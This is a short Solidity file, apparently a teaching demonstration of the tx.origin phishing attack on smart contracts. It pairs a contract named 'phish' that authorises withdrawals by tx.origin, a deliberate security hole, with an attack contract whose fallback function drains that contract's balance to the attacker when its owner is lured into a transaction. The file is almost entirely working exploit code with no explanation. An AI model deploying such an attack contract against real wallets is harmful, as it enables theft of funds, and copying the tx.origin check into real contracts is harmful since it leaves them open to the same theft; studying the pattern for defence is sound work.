// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract phish {
    address public owner;
    constructor () {
    owner = msg.sender;
    }
    receive() external payable{}

    fallback() external payable{}

    function withdrawAll (address payable _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance);
    }
    function getOwner() public view returns(address) {
        return owner;
    }
}

contract TxOrigin {
    address  owner;
    phish PH;

    constructor(address phishAddr) {
        owner = msg.sender;
        PH=phish(payable(phishAddr));
    }

    function attack() internal {
        address phOwner = PH.getOwner();
        if (phOwner == msg. sender) {
            PH.withdrawAll(payable(owner));
        } else {
            payable(owner).transfer(address(this). balance);
        }
    }
    fallback() external payable{
        attack();
    }
}
